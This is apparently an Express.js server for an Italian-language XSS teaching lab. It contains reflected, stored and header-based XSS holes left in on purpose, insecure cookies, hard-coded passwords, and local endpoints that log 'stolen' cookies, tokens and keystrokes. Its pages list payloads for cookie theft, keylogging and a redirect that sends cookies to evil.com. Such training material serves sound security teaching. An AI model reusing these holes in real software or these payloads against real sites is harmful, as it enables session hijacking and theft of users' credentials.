const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const path = require('path');
const app = express();
const port = 3001;

// Middleware configuration
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// Session configuration (intentionally insecure for demo)
app.use(session({
  secret: 'insecure-secret-key', // ⚠️ Weak secret for demo
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: false, // ⚠️ Not HTTPS-only for demo
    httpOnly: false, // ⚠️ Accessible via JavaScript for XSS demo
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
}));

// In-memory storage for demonstration (vulnerable to XSS)
let users = [
  { id: 1, username: 'admin', password: 'admin123', email: 'admin@company.com', role: 'admin', sessionToken: 'admin-token-123' },
  { id: 2, username: 'john', password: 'password', email: 'john@email.com', role: 'user', sessionToken: 'user-token-456' },
  { id: 3, username: 'alice', password: 'secret', email: 'alice@email.com', role: 'moderator', sessionToken: 'mod-token-789' }
];

let comments = [];
let guestbook = [];
let userProfiles = new Map();

// Initialize some sample data
userProfiles.set(1, { bio: 'System Administrator', interests: 'Security, Programming' });
userProfiles.set(2, { bio: 'Web Developer', interests: 'JavaScript, React' });
userProfiles.set(3, { bio: 'Content Moderator', interests: 'Community Management' });

// Basic route with XSS attack examples
app.get('/', (req, res) => {
  res.send(`
    <h1>🔓 Cross-Site Scripting (XSS) Vulnerability Demo</h1>
    <p><strong>⚠️ ATTENZIONE: Questo server è intenzionalmente vulnerabile per scopi educativi!</strong></p>
    
    <h2>🎯 Endpoint Vulnerabili XSS:</h2>
    <ul>
      <li><strong>GET /profile?name=X</strong> - Profilo utente (Reflected XSS)</li>
      <li><strong>POST /comment</strong> - Aggiungi commento (Stored XSS)</li>
      <li><strong>GET /search?q=X</strong> - Ricerca (Reflected XSS)</li>
      <li><strong>POST /guestbook</strong> - Libro degli ospiti (Stored XSS)</li>
      <li><strong>GET /header-info</strong> - Info header (Header-based XSS)</li>
      <li><strong>POST /login</strong> - Login con token (Token theft)</li>
      <li><strong>GET /dashboard</strong> - Dashboard utente (Session-based attacks)</li>
    </ul>

    <h2>🔴 Tipi di Attacchi XSS:</h2>
    
    <h3>1. Reflected XSS (Non-Persistent):</h3>
    <p>Il payload viene eseguito immediatamente e riflesso nella risposta</p>
    <div style="display: flex; flex-direction: column; gap: 5px;">
    <code>GET /profile?name=&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
    <code>GET /search?q=&lt;img src=x onerror=alert('XSS')&gt;</code><br>
    <code>GET /profile?name=&lt;svg onload=alert('Cookie: '+document.cookie)&gt;</code>
    </div>

    <h3>2. Stored XSS (Persistent):</h3>
    <p>Il payload viene memorizzato e eseguito ogni volta che la pagina viene caricata</p>
    <form action="/comment" method="post">
      <input type="text" name="username" placeholder="Username" style="width: 200px;"><br><br>
      <textarea name="message" placeholder="Commento (try: &lt;script&gt;fetch('/steal-token?token='+document.cookie)&lt;/script&gt;)" style="width: 400px; height: 80px;"></textarea><br><br>
      <input type="submit" value="Aggiungi Commento" style="background: #ff6b6b; color: white; padding: 8px;">
    </form>

    <h3>3. DOM-based XSS:</h3>
    <p>Manipolazione del DOM lato client</p>
    <form action="/search" method="get">
      <input type="text" name="q" placeholder="Search (try: &lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked!&lt;/h1&gt;'&lt;/script&gt;)" style="width: 400px;"><br><br>
      <input type="submit" value="Cerca" style="background: #ff6b6b; color: white; padding: 8px;">
    </form>

    <h3>4. Header-based XSS:</h3>
    <p>XSS tramite manipolazione degli header HTTP</p>
    <p>Prova a modificare il tuo User-Agent con: <code>&lt;script&gt;alert('Header XSS')&lt;/script&gt;</code></p>
    <a href="/header-info" style="color: #ff6b6b; text-decoration: underline;">Visualizza Header Info</a>

    <h3>5. Token Theft Demo:</h3>
    <form action="/login" method="post">
      <input type="text" name="username" value="admin" placeholder="Username"><br><br>
      <input type="password" name="password" value="admin123" placeholder="Password"><br><br>
      <input type="submit" value="Login per ottenere token" style="background: #4CAF50; color: white; padding: 8px;">
    </form>

    <div style="margin-top: 20px; padding: 15px; background: #ffe6e6; border-radius: 5px;">
      <h4>🎯 Attacchi Avanzati:</h4>
      <p><strong>Cookie Stealing:</strong> <code>&lt;script&gt;fetch('/steal-cookie?c='+document.cookie)&lt;/script&gt;</code></p>
      <p><strong>Session Hijacking:</strong> <code>&lt;script&gt;fetch('/hijack?session='+document.cookie)&lt;/script&gt;</code></p>
      <p><strong>Keylogger:</strong> <code>&lt;script&gt;document.onkeypress=function(e){fetch('/keylog?key='+e.key)}&lt;/script&gt;</code></p>
      <p><strong>Redirect Attack:</strong> <code>&lt;script&gt;window.location='http://evil.com/steal?data='+document.cookie&lt;/script&gt;</code></p>
    </div>

    <h2>📊 Visualizza Dati:</h2>
    <a href="/comments" style="color: blue;">Visualizza tutti i commenti</a> | 
    <a href="/guestbook-view" style="color: blue;">Visualizza libro ospiti</a> | 
    <a href="/stolen-data" style="color: blue;">Dati rubati</a>
    
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
      code { background: #ffe6e6; padding: 4px; border-radius: 3px; display: inline-block; }
      form { background: white; padding: 15px; margin: 10px 0; border-radius: 5px; }
      h3 { color: #d32f2f; }
    </style>
  `);
});

// 🔴 VULNERABILITÀ 1: Reflected XSS - Profile page
app.get('/profile', (req, res) => {
  const name = req.query.name || 'Guest';

  console.log(`🔍 Profile request for: ${name}`);

  // ⚠️ VULNERABILE: Input direttamente inserito nell'HTML senza sanitizzazione
  const html = `
    <h1>Profilo Utente</h1>
    <h2>Benvenuto, ${name}!</h2>
    <p>Questa è la pagina del profilo per: <strong>${name}</strong></p>
    <p>⚠️ <em>Reflected XSS Vulnerability: Il parametro 'name' viene inserito direttamente nell'HTML</em></p>
    
    <div style="margin-top: 20px;">
      <h3>Cookie correnti:</h3>
      <script>document.write('<p>Cookies: ' + document.cookie + '</p>');</script>
    </div>
    
    <div style="margin-top: 20px; padding: 10px; background: #f0f0f0;">
      <h4>Test Reflected XSS:</h4>
      <p>Prova questi payload nell'URL:</p>
      <ul>
        <li><code>/profile?name=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
        <li><code>/profile?name=&lt;img src=x onerror=alert('Cookie: '+document.cookie)&gt;</code></li>
        <li><code>/profile?name=&lt;svg onload=fetch('/steal-cookie?c='+document.cookie)&gt;</code></li>
      </ul>
    </div>
    
    <a href="/">← Torna alla home</a>
    
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; }
      code { background: #ffe6e6; padding: 2px 4px; border-radius: 3px; }
    </style>
  `;

  res.send(html);
});

// 🔴 VULNERABILITÀ 2: Stored XSS - Comments system
app.post('/comment', (req, res) => {
  const { username, message } = req.body;

  if (!username || !message) {
    return res.json({ error: 'Username e messaggio richiesti' });
  }

  console.log(`💬 New comment from ${username}: ${message}`);

  // ⚠️ VULNERABILE: Memorizzazione diretta senza sanitizzazione
  const comment = {
    id: comments.length + 1,
    username: username,
    message: message, // Stored XSS vulnerability
    timestamp: new Date().toLocaleString(),
    ip: req.ip
  };

  comments.push(comment);

  res.json({
    success: true,
    message: 'Commento aggiunto con successo',
    comment: comment,
    vulnerability: 'Stored XSS - Il messaggio viene memorizzato senza sanitizzazione',
    warning: 'Script malevoli verranno eseguiti quando altri utenti visualizzeranno i commenti'
  });
});

// Visualizza tutti i commenti (Stored XSS execution)
app.get('/comments', (req, res) => {
  let commentsHtml = comments.map(comment => `
    <div style="border: 1px solid #ccc; margin: 10px 0; padding: 10px; border-radius: 5px;">
      <strong>👤 ${comment.username}</strong> <span style="color: #666;">(${comment.timestamp})</span><br>
      <div style="margin-top: 5px;">${comment.message}</div>
    </div>
  `).join('');

  if (comments.length === 0) {
    commentsHtml = '<p><em>Nessun commento ancora. <a href="/">Aggiungi il primo!</a></em></p>';
  }

  const html = `
    <h1>💬 Commenti degli Utenti</h1>
    <p>⚠️ <strong>Stored XSS Vulnerability:</strong> I commenti vengono visualizzati senza sanitizzazione</p>
    
    ${commentsHtml}
    
    <div style="margin-top: 30px; padding: 15px; background: #fff3cd; border-radius: 5px;">
      <h3>🎯 Come sfruttare Stored XSS:</h3>
      <ol>
        <li>Vai alla <a href="/">homepage</a></li>
        <li>Inserisci un payload XSS nel form commenti</li>
        <li>Torna qui per vedere il payload eseguito</li>
        <li>Ogni utente che visita questa pagina eseguirà il codice</li>
      </ol>
    </div>
    
    <p><a href="/">← Torna alla home</a> | <a href="/comments">🔄 Ricarica commenti</a></p>
    
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; }
      code { background: #ffe6e6; padding: 2px 4px; border-radius: 3px; }
    </style>
  `;

  res.send(html);
});

// 🔴 VULNERABILITÀ 3: Reflected XSS - Search functionality
app.get('/search', (req, res) => {
  const query = req.query.q || '';

  console.log(`🔍 Search query: ${query}`);

  // Simulate search results
  const results = users.filter(user =>
    user.username.toLowerCase().includes(query.toLowerCase()) ||
    user.email.toLowerCase().includes(query.toLowerCase())
  );

  // ⚠️ VULNERABILE: Query inserita direttamente nell'HTML
  const html = `
    <h1>🔍 Risultati di Ricerca</h1>
    <h2>Ricerca per: "${query}"</h2>
    
    <div style="margin: 20px 0;">
      ${results.length > 0 ?
      '<h3>Utenti trovati:</h3>' + results.map(user => `
          <div style="border: 1px solid #ddd; padding: 10px; margin: 5px 0; border-radius: 3px;">
            <strong>${user.username}</strong> - ${user.email} (${user.role})
          </div>
        `).join('') :
      '<p>Nessun utente trovato per la ricerca: <em>' + query + '</em></p>'
    }
    </div>
    
    <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 5px;">
      <h4>⚠️ Reflected XSS Vulnerability</h4>
      <p>Il parametro di ricerca viene inserito direttamente nell'HTML senza encoding.</p>
      <p><strong>Test payload:</strong></p>
      <ul>
        <li><code>/search?q=&lt;script&gt;alert('Search XSS')&lt;/script&gt;</code></li>
        <li><code>/search?q=&lt;img src=x onerror=alert(document.domain)&gt;</code></li>
        <li><code>/search?q=&lt;svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))&gt;</code> (Base64)</li>
      </ul>
    </div>
    
    <form method="get" style="margin-top: 20px;">
      <input type="text" name="q" value="${query}" placeholder="Nuova ricerca..." style="width: 300px; padding: 5px;">
      <input type="submit" value="Cerca" style="padding: 5px 10px;">
    </form>
    
    <p><a href="/">← Torna alla home</a></p>
    
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; }
      code { background: #ffe6e6; padding: 2px 4px; border-radius: 3px; }
    </style>
  `;

  res.send(html);
});

// 🔴 VULNERABILITÀ 4: Header-based XSS
app.get('/header-info', (req, res) => {
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers['referer'] || 'Direct access';
  const xForwardedFor = req.headers['x-forwarded-for'] || req.ip;

  console.log(`📋 Header info request - User-Agent: ${userAgent}`);

  // ⚠️ VULNERABILE: Header values inseriti direttamente nell'HTML
  const html = `
    <h1>📋 Informazioni Header HTTP</h1>
    <p>⚠️ <strong>Header-based XSS:</strong> Gli header HTTP vengono visualizzati senza sanitizzazione</p>
    
    <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 20px 0;">
      <h3>Header ricevuti:</h3>
      <p><strong>User-Agent:</strong> ${userAgent}</p>
      <p><strong>Referer:</strong> ${referer}</p>
      <p><strong>IP Address:</strong> ${xForwardedFor}</p>
      <p><strong>Host:</strong> ${req.headers.host}</p>
      <p><strong>Accept:</strong> ${req.headers.accept || 'Not specified'}</p>
    </div>
    
    <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0;">
      <h3>🎯 Come sfruttare Header-based XSS:</h3>
      <p>Modifica il tuo User-Agent (usando Burp Suite, browser dev tools, o curl):</p>
      <pre style="background: #f8f9fa; padding: 10px; border-radius: 3px;">
curl -H "User-Agent: &lt;script&gt;alert('Header XSS')&lt;/script&gt;" http://localhost:3001/header-info

curl -H "User-Agent: &lt;img src=x onerror=fetch('/steal-cookie?c='+document.cookie)&gt;" http://localhost:3001/header-info

curl -H "Referer: javascript:alert('XSS')" http://localhost:3001/header-info</pre>
      
      <p><strong>⚠️ Nota:</strong> In un attacco reale, la vittima visiterebbe questa pagina con header modificati tramite tecniche di social engineering.</p>
    </div>
    
    <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0;">
      <h3>🔍 Tutti gli Header ricevuti:</h3>
      <pre>${JSON.stringify(req.headers, null, 2)}</pre>
    </div>
    
    <p><a href="/">← Torna alla home</a></p>
    
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; }
      pre { overflow-x: auto; }
    </style>
  `;

  res.send(html);
});

// 🔴 VULNERABILITÀ 5: Login e Token Storage (Session-based attacks)
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  const user = users.find(u => u.username === username && u.password === password);

  if (user) {
    // ⚠️ VULNERABILE: Token memorizzato in cookie non sicuro
    req.session.userId = user.id;
    req.session.username = user.username;
    req.session.token = user.sessionToken;

    // Set additional insecure cookies
    res.cookie('authToken', user.sessionToken, {
      httpOnly: false, // ⚠️ Accessible via JavaScript
      secure: false    // ⚠️ Not HTTPS-only
    });
    res.cookie('userRole', user.role, { httpOnly: false });

    console.log(`✅ Login successful for ${username}, token: ${user.sessionToken}`);

    res.json({
      success: true,
      message: 'Login effettuato con successo!',
      user: { id: user.id, username: user.username, email: user.email, role: user.role },
      sessionToken: user.sessionToken,
      vulnerability: 'Token memorizzato in cookie non sicuro (httpOnly: false)',
      nextStep: 'Visita /dashboard per vedere la sessione attiva'
    });
  } else {
    res.status(401).json({
      success: false,
      message: 'Credenziali non valide',
      hint: 'Prova admin/admin123 o john/password'
    });
  }
});

// Dashboard con informazioni sensibili della sessione
app.get('/dashboard', (req, res) => {
  if (!req.session.userId) {
    return res.redirect('/');
  }

  const user = users.find(u => u.id === req.session.userId);
  const profile = userProfiles.get(user.id);

  const html = `
    <h1>🏠 Dashboard Utente</h1>
    <p>Benvenuto, <strong>${req.session.username}</strong>!</p>
    
    <div style="background: #e8f5e8; padding: 15px; border-radius: 5px; margin: 20px 0;">
      <h3>🔑 Informazioni Sessione:</h3>
      <p><strong>User ID:</strong> ${req.session.userId}</p>
      <p><strong>Username:</strong> ${req.session.username}</p>
      <p><strong>Session Token:</strong> ${req.session.token}</p>
      <p><strong>Ruolo:</strong> ${user.role}</p>
      <p><strong>Email:</strong> ${user.email}</p>
    </div>
    
    <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0;">
      <h3>⚠️ Vulnerabilità Token/Session:</h3>
      <p>Questa pagina espone informazioni sensibili della sessione che possono essere rubate via XSS:</p>
      <ul>
        <li><strong>Cookie leggibili da JavaScript:</strong> authToken, userRole</li>
        <li><strong>Session token esposto:</strong> Visibile nel DOM</li>
        <li><strong>Informazioni privilegiate:</strong> Accessibili senza validazione</li>
      </ul>
      
      <h4>🎯 Test di XSS per rubare i token:</h4>
      <p>Se riesci a eseguire XSS su questa pagina, potresti rubare:</p>
      <pre style="background: #f8f9fa; padding: 10px; border-radius: 3px;">
document.cookie              // Tutti i cookie
sessionStorage               // Storage della sessione
localStorage                 // Storage locale
fetch('/steal-session')      // Inviare dati a server malevolo</pre>
    </div>
    
    <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0;">
      <h3>📝 Profilo Utente (Modifica con XSS):</h3>
      <form action="/update-profile" method="post">
        <p><strong>Bio:</strong></p>
        <textarea name="bio" style="width: 100%; height: 60px;">${profile ? profile.bio : ''}</textarea>
        <p><strong>Interessi:</strong></p>
        <input type="text" name="interests" value="${profile ? profile.interests : ''}" style="width: 100%;">
        <br><br>
        <input type="submit" value="Aggiorna Profilo" style="background: #007bff; color: white; padding: 8px 16px; border: none; border-radius: 3px;">
      </form>
    </div>
    
    <script>
      // ⚠️ VULNERABILE: JavaScript inline che espone dati sensibili
      console.log('Session info:', {
        userId: '${req.session.userId}',
        username: '${req.session.username}',
        token: '${req.session.token}',
        cookies: document.cookie
      });
      
      // Simula controlli di sicurezza deboli
      function checkAuth() {
        return document.cookie.includes('authToken');
      }
    </script>
    
    <p><a href="/logout">🚪 Logout</a> | <a href="/">← Home</a></p>
    
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; }
      pre { overflow-x: auto; }
    </style>
  `;

  res.send(html);
});

// Update profile (vulnerable to stored XSS)
app.post('/update-profile', (req, res) => {
  if (!req.session.userId) {
    return res.redirect('/');
  }

  const { bio, interests } = req.body;

  // ⚠️ VULNERABILE: Dati memorizzati senza sanitizzazione
  userProfiles.set(req.session.userId, {
    bio: bio,
    interests: interests
  });

  console.log(`📝 Profile updated for user ${req.session.userId}`);

  res.json({
    success: true,
    message: 'Profilo aggiornato con successo!',
    vulnerability: 'Stored XSS - I dati del profilo vengono memorizzati senza sanitizzazione',
    warning: 'Script malevoli nel profilo verranno eseguiti quando visualizzati'
  });
});

// Logout
app.get('/logout', (req, res) => {
  req.session.destroy();
  res.clearCookie('authToken');
  res.clearCookie('userRole');
  res.clearCookie('connect.sid');

  res.json({
    success: true,
    message: 'Logout effettuato con successo',
    note: 'Sessione e cookie eliminati'
  });
});

// 🔴 VULNERABILITÀ 6: Guestbook (Stored XSS)
app.post('/guestbook', (req, res) => {
  const { name, message } = req.body;

  if (!name || !message) {
    return res.json({ error: 'Nome e messaggio richiesti' });
  }

  // ⚠️ VULNERABILE: Stored XSS nel guestbook
  guestbook.push({
    id: guestbook.length + 1,
    name: name,
    message: message,
    timestamp: new Date().toLocaleString(),
    ip: req.ip
  });

  console.log(`📖 New guestbook entry from ${name}`);

  res.json({
    success: true,
    message: 'Messaggio aggiunto al libro degli ospiti',
    vulnerability: 'Stored XSS in guestbook'
  });
});

// View guestbook
app.get('/guestbook-view', (req, res) => {
  let entries = guestbook.map(entry => `
    <div style="border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; background: #fafafa;">
      <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
        <strong style="color: #333;">👤 ${entry.name}</strong>
        <span style="color: #666; font-size: 0.9em;">${entry.timestamp}</span>
      </div>
      <div style="line-height: 1.4;">${entry.message}</div>
    </div>
  `).join('');

  if (guestbook.length === 0) {
    entries = '<p><em>Nessun messaggio nel libro degli ospiti.</em></p>';
  }

  const html = `
    <h1>📖 Libro degli Ospiti</h1>
    <p>⚠️ <strong>Stored XSS Vulnerability:</strong> I messaggi vengono memorizzati e visualizzati senza sanitizzazione</p>
    
    ${entries}
    
    <div style="margin-top: 30px; padding: 15px; background: white; border-radius: 5px; border: 1px solid #ddd;">
      <h3>✍️ Aggiungi un messaggio:</h3>
      <form action="/guestbook" method="post">
        <input type="text" name="name" placeholder="Il tuo nome" style="width: 200px; padding: 5px; margin-bottom: 10px;"><br>
        <textarea name="message" placeholder="Scrivi un messaggio... (prova payload XSS)" style="width: 100%; height: 80px; padding: 5px;"></textarea><br><br>
        <input type="submit" value="Aggiungi Messaggio" style="background: #28a745; color: white; padding: 8px 16px; border: none; border-radius: 3px;">
      </form>
    </div>
    
    <div style="margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 5px;">
      <h4>🎯 Test Stored XSS Payload:</h4>
      <ul>
        <li><code>&lt;script&gt;alert('Guestbook XSS')&lt;/script&gt;</code></li>
        <li><code>&lt;img src=x onerror=alert('Persistent XSS')&gt;</code></li>
        <li><code>&lt;svg onload=fetch('/steal-cookie?source=guestbook&c='+document.cookie)&gt;</code></li>
      </ul>
    </div>
    
    <p><a href="/">← Torna alla home</a></p>
    
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; background: #f8f9fa; }
      code { background: #ffe6e6; padding: 2px 4px; border-radius: 3px; }
    </style>
  `;

  res.send(html);
});

// 🕵️ ENDPOINTS per simulare data exfiltration

// Storage per dati "rubati"
let stolenData = [];

// Endpoint per "rubare" cookie
app.get('/steal-cookie', (req, res) => {
  const cookie = req.query.c || 'No cookie';
  const source = req.query.source || 'unknown';

  stolenData.push({
    type: 'cookie',
    data: cookie,
    source: source,
    timestamp: new Date().toLocaleString(),
    ip: req.ip,
    userAgent: req.headers['user-agent']
  });

  console.log(`🍪 Cookie stolen from ${source}: ${cookie}`);

  // Return a 1x1 transparent pixel to avoid breaking the page
  const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==', 'base64');
  res.set('Content-Type', 'image/png');
  res.send(pixel);
});

// Endpoint per "rubare" token di sessione
app.get('/steal-token', (req, res) => {
  const token = req.query.token || 'No token';

  stolenData.push({
    type: 'session_token',
    data: token,
    timestamp: new Date().toLocaleString(),
    ip: req.ip,
    userAgent: req.headers['user-agent']
  });

  console.log(`🔑 Session token stolen: ${token}`);

  res.status(204).send(); // No content response
});

// Endpoint per keylogger simulation
app.get('/keylog', (req, res) => {
  const key = req.query.key || '';

  stolenData.push({
    type: 'keylog',
    data: key,
    timestamp: new Date().toLocaleString(),
    ip: req.ip
  });

  console.log(`⌨️  Key logged: ${key}`);
  res.status(204).send();
});

// Session hijacking endpoint
app.get('/hijack', (req, res) => {
  const session = req.query.session || 'No session';

  stolenData.push({
    type: 'session_hijack',
    data: session,
    timestamp: new Date().toLocaleString(),
    ip: req.ip,
    userAgent: req.headers['user-agent']
  });

  console.log(`🏴‍☠️ Session hijack attempt: ${session}`);
  res.status(204).send();
});

// View stolen data
app.get('/stolen-data', (req, res) => {
  const dataHtml = stolenData.map((item, index) => `
    <div style="border: 1px solid #dc3545; margin: 10px 0; padding: 10px; border-radius: 5px; background: #f8d7da;">
      <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
        <strong style="color: #721c24;">🎯 ${item.type.toUpperCase()}</strong>
        <span style="color: #721c24; font-size: 0.9em;">${item.timestamp}</span>
      </div>
      <div style="font-family: monospace; background: #fff; padding: 8px; border-radius: 3px; margin: 5px 0;">
        ${item.data}
      </div>
      <div style="font-size: 0.8em; color: #721c24;">
        IP: ${item.ip} ${item.userAgent ? `| User-Agent: ${item.userAgent.substring(0, 50)}...` : ''}
        ${item.source ? `| Source: ${item.source}` : ''}
      </div>
    </div>
  `).join('');

  const html = `
    <h1>🕵️ Dati "Rubati" tramite XSS</h1>
    <p>⚠️ Questo endpoint mostra i dati che sarebbero stati esfiltrati in un attacco XSS reale</p>
    
    <div style="margin: 20px 0; padding: 15px; background: #d4edda; border-radius: 5px;">
      <h3>📊 Statistiche:</h3>
      <p><strong>Totale attacchi registrati:</strong> ${stolenData.length}</p>
      <p><strong>Cookie rubati:</strong> ${stolenData.filter(d => d.type === 'cookie').length}</p>
      <p><strong>Token di sessione:</strong> ${stolenData.filter(d => d.type === 'session_token').length}</p>
      <p><strong>Keystroke loggati:</strong> ${stolenData.filter(d => d.type === 'keylog').length}</p>
      <p><strong>Tentativi di hijack:</strong> ${stolenData.filter(d => d.type === 'session_hijack').length}</p>
    </div>
    
    ${stolenData.length > 0 ?
      '<h2>🎯 Dati Catturati:</h2>' + dataHtml :
      '<p><em>Nessun dato rubato ancora. Prova ad eseguire alcuni attacchi XSS!</em></p>'
    }
    
    <div style="margin-top: 20px;">
      <button onclick="if(confirm('Eliminare tutti i dati rubati?')) fetch('/clear-stolen-data', {method: 'POST'}).then(() => location.reload())" 
              style="background: #dc3545; color: white; padding: 8px 16px; border: none; border-radius: 3px;">
        🗑️ Cancella dati rubati
      </button>
    </div>
    
    <p><a href="/">← Torna alla home</a></p>
    
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; background: #f8f9fa; }
    </style>
  `;

  res.send(html);
});

// Clear stolen data
app.post('/clear-stolen-data', (req, res) => {
  stolenData = [];
  console.log('🧹 Stolen data cleared');
  res.json({ success: true, message: 'Dati rubati cancellati' });
});

// 📊 API endpoint per ottenere dati in formato JSON
app.get('/api/users', (req, res) => {
  // Return users without passwords for API access
  const safeUsers = users.map(user => ({
    id: user.id,
    username: user.username,
    email: user.email,
    role: user.role
  }));

  res.json({
    success: true,
    users: safeUsers,
    total: safeUsers.length
  });
});

app.get('/api/comments', (req, res) => {
  res.json({
    success: true,
    comments: comments,
    total: comments.length
  });
});

app.get('/api/guestbook', (req, res) => {
  res.json({
    success: true,
    entries: guestbook,
    total: guestbook.length
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('💥 Server error:', err.stack);
  res.status(500).json({
    error: 'Internal server error',
    details: err.message,
    note: 'This might be caused by XSS payloads'
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).send(`
    <h1>404 - Pagina non trovata</h1>
    <p>La pagina che stai cercando non esiste.</p>
    <p><a href="/">← Torna alla home</a></p>
  `);
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down XSS demo server...');
  process.exit(0);
});

// Start the server
app.listen(port, () => {
  console.log('\n🔓 ==========================================');
  console.log('      XSS VULNERABILITY DEMO SERVER');
  console.log('🔓 ==========================================');
  console.log(`🌐 Server running at http://localhost:${port}`);
  console.log('⚠️  WARNING: This server is INTENTIONALLY VULNERABLE!');
  console.log('📚 For educational purposes only');
  console.log('🎯 Available XSS attack vectors:');
  console.log('   • Reflected XSS (URL parameters)');
  console.log('   • Stored XSS (Comments, Guestbook, Profiles)');
  console.log('   • Header-based XSS (HTTP headers)');
  console.log('   • DOM-based XSS (Client-side manipulation)');
  console.log('   • Session/Token theft via XSS');
  console.log('🍪 Insecure cookies and session management');
  console.log('📊 Data exfiltration endpoints for demonstration');
  console.log('🔓 ==========================================\n');
});
